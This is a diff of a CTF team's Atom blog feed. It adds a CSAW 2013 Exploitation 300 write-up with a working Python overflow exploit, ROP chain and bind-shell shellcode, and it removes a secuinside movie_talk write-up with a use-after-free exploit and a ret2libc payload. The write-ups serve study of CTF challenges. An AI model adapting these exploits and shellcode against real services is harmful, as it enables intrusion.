@@ -4,7 +4,7 @@
   <title><![CDATA[blue-lotus]]></title>
   <link href="http://www.blue-lotus.net//atom.xml" rel="self"/>
   <link href="http://www.blue-lotus.net//"/>
-  <updated>2013-09-24T00:56:47+08:00</updated>
+  <updated>2013-09-24T12:33:24+08:00</updated>
   <id>http://www.blue-lotus.net//</id>
   <author>
     <name><![CDATA[blue-lotus]]></name>
@@ -14,10 +14,124 @@
 
   
   <entry>
-    <title type="html"><![CDATA[CSAW CTF 2013 crypto500 writeup]]></title>
-    <link href="http://www.blue-lotus.net//csaw-ctf-2013-crypto500-writeup/"/>
+    <title type="html"><![CDATA[CSAW CTF Quals 2013 Exploitation 300 writeup]]></title>
+    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup/"/>
+    <updated>2013-09-24T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup</id>
+    <content type="html"><![CDATA[<p>That is a network service. I can connect it by netcat. then i must input <strong>username</strong> <strong>password</strong> and seomething else.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/nclogin.png" alt="1" /></p>
+
+<p>After i analysis the service. I find out the process of login and i find the <strong>username</strong> and <strong>password</strong></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/username.png" alt="2" /> <img src="http://www.blue-lotus.net/images/2013/password.png" alt="3" /> <img src="http://www.blue-lotus.net/images/2013/dbup.png" alt="4" /></p>
+
+<p>Then I input username and password. I input a number(<strong>size</strong>) and a string(<strong>buff</strong>). </p>
+
+<p>“size” &gt; 1 and “size” + 1 &lt; 0x400</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/size.png" alt="5" /></p>
+
+<p>Then I input The buff and the buff must ASCII Characters.</p>
+
+<p>last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.</p>
+
+<p>there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. </p>
+
+<p><code>
+0xffff + 1 == ； 0 0xffff == 65535
+</code></p>
+
+<p>now we can input any string which we want :)</p>
+
+<p>then i will write the exp.</p>
+
+<p><code>
+'A' * 0x420 + ret_address
+</code>
+there is not “jmp esp” in program when i use objdump. but the program use the function of read. i can use <strong>read</strong> to write “jmp esp” in static area.</p>
+
+<p>read(fd, buff, buffsize)</p>
+
+<p>read: call   80486e0 <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;">&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;</a> </p>
+
+<p>fd:4 (the fd of client socket)</p>
+
+<p>read( 4, *0x080486e0, 2)</p>
+
+<p>now the send “jmp esp” and the program will write in memory.</p>
+
+<p><code>
+'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
+</code></p>
+
+<p>now I did it.use the exp and use <strong>nc</strong> connect remote server.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/exp.png" alt="6" /></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/remote.png" alt="7" /></p>
+
+<h2 id="exp">Exp</h2>
+
+<div><div class="CodeRay">
+  <div class="code"><pre><span class="keyword">import</span> <span class="include">sys</span>, <span class="include">os</span>, <span class="include">time</span>, <span class="include">struct</span>, <span class="include">socket</span>
+
+<span class="keyword">def</span> <span class="function">p32</span>(addr):
+    <span class="keyword">return</span> struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;I</span><span class="delimiter">&quot;</span></span>, addr)
+
+<span class="keyword">def</span> <span class="function">r</span>(s, t=<span class="float">0.1</span>):
+    time.sleep(t)
+    <span class="keyword">return</span> s.recv(<span class="integer">8192</span>)
+
+<span class="keyword">def</span> <span class="function">se</span>(s, buf):
+    s.send(buf)
+
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">128.238.66.217</span><span class="delimiter">&quot;</span></span>
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">192.168.1.180</span><span class="delimiter">&quot;</span></span>
+PORT = <span class="integer">34266</span>
+
+SHELLCODE = \
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x31</span><span class="char">\xdb</span><span class="char">\xf7</span><span class="char">\xe3</span><span class="char">\x53</span><span class="char">\x43</span><span class="char">\x53</span><span class="char">\x6a</span><span class="char">\x02</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x5b</span><span class="char">\x5e</span><span class="char">\x52</span><span class="char">\x68</span><span class="char">\x02</span><span class="char">\x00</span><span class="char">\x11</span><span class="char">\x5c</span><span class="char">\x6a</span><span class="char">\x10</span><span class="char">\x51</span><span class="char">\x50</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\x6a</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x89</span><span class="char">\x41</span><span class="char">\x04</span><span class="char">\xb3</span><span class="char">\x04</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x43</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x93</span><span class="char">\x59</span><span class="char">\x6a</span><span class="char">\x3f</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x49</span><span class="char">\x79</span><span class="char">\xf8</span><span class="char">\x68</span><span class="char">\x2f</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x2f</span><span class="char">\x73</span><span class="char">\x68</span><span class="char">\x68</span><span class="char">\x2f</span><span class="char">\x62</span><span class="char">\x69</span><span class="char">\x6e</span><span class="char">\x89</span><span class="char">\xe3</span><span class="char">\x50</span><span class="char">\x53</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x0b</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span>
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">csaw2013</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">S1mplePWD</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">65535</span><span class="delimiter">&quot;</span></span>)
+read = p32(<span class="hex">0x80486e0</span>)
+pop3ret = p32(<span class="hex">0x8049110</span>)
+static = p32(<span class="hex">0x804b000</span>)
+fd = p32(<span class="integer">4</span>)
+jmpesp = <span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xe4</span><span class="delimiter">&quot;</span></span>
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * (<span class="integer">1056</span> + <span class="integer">0</span>)
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * <span class="hex">0x420</span>
+buf += read + pop3ret + fd + static + p32(<span class="integer">2</span>) + static + <span class="string"><span class="delimiter">&quot;</span><span class="char">\x90</span><span class="delimiter">&quot;</span></span> * <span class="integer">100</span> + SHELLCODE
+se(s, buf)
+time.sleep(<span class="integer">5</span>)
+se(s, jmpesp)
+<span class="keyword">print</span> <span class="string"><span class="delimiter">'</span><span class="content">OK!!!</span><span class="delimiter">'</span></span>
+</pre></div>
+</div>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW CTF Quals 2013 crypto500 writeup]]></title>
+    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup/"/>
     <updated>2013-09-23T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//csaw-ctf-2013-crypto500-writeup</id>
+    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup</id>
     <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
 <p>We’ve found the source to the Arstotzka spies rendevous server, we must find out their new vault key. Source code is <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Crypto/slurp-500/slurp.py">here</a>.</p>
 
@@ -3142,62 +3256,6 @@ admin login disabled
 <p>I use firefox and burpsuite to deal with this idea and then I got the key.</p>
 
 <p>It’s too easy and no law to see(lol, you should understand this piece of English via Chinese)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[secuinside CTF 2013 quals movie_talk writeup]]></title>
-    <link href="http://www.blue-lotus.net//secuinside-ctf-2013-quals-movie_talk-writeup/"/>
-    <updated>2013-06-11T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//secuinside-ctf-2013-quals-movie_talk-writeup</id>
-    <content type="html"><![CDATA[<p>The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed that there is a SIGQUIT(number 3) handler to free all allocated data structure of movies, but it failed to clean the pointers of movies, which leads to a use after free bug. Data structure of a movie is as below:</p>
-
-<pre><code>struct Movie
-{
-  void *handler;
-  char *name;
-  int id;
-  int rating;
-  int rate
-};
-</code></pre>
-
-<p>For each movie, the memories for the <code>Movie</code> struct and <code>Movie-&gt;name</code> are allocated on the heap. First, we can add a movie. Then, we add the second. However, at the moment before the program prompt to get movie name, we send SIGQUIT and get the first movie structure freed. Then the program get back to receive the second movie’s name. If we input a string with a appropriate length, the allocated chunk for the second movie’s name could be the same as the first movie’s struct, which has just been freed. Luckily, the pointer of the first movie still points to the original chunk. Thus, the first 4 bytes of the second movie’s name will become the first movie’s handler, which can be used controlled.</p>
-
-<p>We use an <code>add esp</code> gadget to migrate the stack to a very high position of the stack. Then we put a lot of common <code>ret2libc</code> combinations <code>system|system|"/bin/sh"|"/bin/sh"</code> in an environment variable, which is right in the higher part of the stack. If the <code>add esp</code> gadget migrate the stack top and hit the one of the <code>system</code> addresses in the environment variable, a shell will be spawned.</p>
-
-<p>Of course, we used the <code>ulimit -s unlimited</code> trick to disable ASLR of the shared library. We get the precise address of <code>system</code> and <code>"/binsh"</code> from the libc library. The environment variable defined by us is as below:</p>
-
-<pre><code>export EXPLOIT=$(python -c 'print "a"*9 + "\x80\xb2\x06\x40\x80\xb2\x06\x40\xf8\x2f\x19\x40\xf8\x2f\x19\x40" * 2000+"a"*15')
-</code></pre>
-
-<p>Python script for exploitation is as below:</p>
-
-<pre><code>import sys
-import os
-import subprocess
-import signal
-import time
-p = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
-# add $0x228c,%esp
-addesp = "\xed\x15\x14\x40"
-# add first movie
-p.stdin.write("1\n1\n1\n0\n")
-time.sleep(3);
-# add second movie
-p.stdin.write("1\n")
-time.sleep(1)
-# free all movies
-p.send_signal(3)
-p.stdin.write(addesp + "AAAABBB\n1\n0\n")
-time.sleep(3)
-# use after free
-p.stdin.write("3\n")
-time.sleep(1)
-# execute shell command
-p.stdin.write("cat key.txt\n")
-time.sleep(1)
-</code></pre>
 ]]></content>
   </entry>
   
